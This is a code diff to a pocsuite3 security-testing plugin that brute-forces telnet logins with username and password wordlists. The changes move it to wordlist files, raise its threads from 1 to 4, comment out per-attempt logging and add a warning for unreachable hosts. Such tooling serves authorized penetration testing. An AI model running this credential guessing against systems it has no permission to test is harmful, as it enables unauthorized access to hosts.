@@ -1,18 +1,16 @@
 """
 If you have issues about development, please read:
 https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
-for more about information, plz visit http://pocsuite.org
+for more about information, plz visit https://pocsuite.org
 """
 import itertools
 import queue
 import socket
 import telnetlib
-from urllib.parse import urlparse
 
-from pocsuite3.api import POCBase, Output, register_poc, logger, POC_CATEGORY
+from pocsuite3.api import POCBase, Output, register_poc, logger, POC_CATEGORY, VUL_TYPE
 from pocsuite3.lib.core.data import paths
 from pocsuite3.lib.core.threads import run_threads
-from pocsuite3.lib.utils import url2ip
 
 
 class DemoPOC(POCBase):
@@ -27,7 +25,7 @@ class DemoPOC(POCBase):
     appPowerLink = ''
     appName = 'telnet'
     appVersion = 'All'
-    vulType = 'Weak Password'
+    vulType = VUL_TYPE.WEAK_PASSWORD
     desc = '''telnet 存在弱密码，导致攻击者可登录主机进行恶意操作'''
     samples = ['']
     category = POC_CATEGORY.TOOLS.CRACK
@@ -66,10 +64,9 @@ result_queue = queue.Queue()
 
 
 def get_word_list():
-    common_username = ('Administrator', 'administrator', 'telnet',
-                       'test', 'root', 'guest', 'admin', 'daemon', 'user')
-    with open(paths.WEAK_PASS) as f:
-        return itertools.product(common_username, f)
+    with open(paths.TELNET_USER) as username:
+        with open(paths.TELNET_PASS) as password:
+            return itertools.product(username, password)
 
 
 def port_check(host, port=23):
@@ -119,8 +116,8 @@ def task_init(host, port):
 def task_thread():
     while not task_queue.empty():
         host, port, username, password = task_queue.get()
-        logger.info('try burst {}:{} use username:{} password:{}'.format(
-            host, port, username, password))
+        # logger.info('try burst {}:{} use username:{} password:{}'.format(
+        #     host, port, username, password))
         if telnet_login(host, port, username, password):
             with task_queue.mutex:
                 task_queue.queue.clear()
@@ -129,11 +126,12 @@ def task_thread():
 
 def telnet_burst(host, port):
     if not port_check(host, port):
+        logger.warning("{}:{} is unreachable".format(host, port))
         return
 
     try:
         task_init(host, port)
-        run_threads(1, task_thread)
+        run_threads(4, task_thread)
     except Exception:
         pass
 
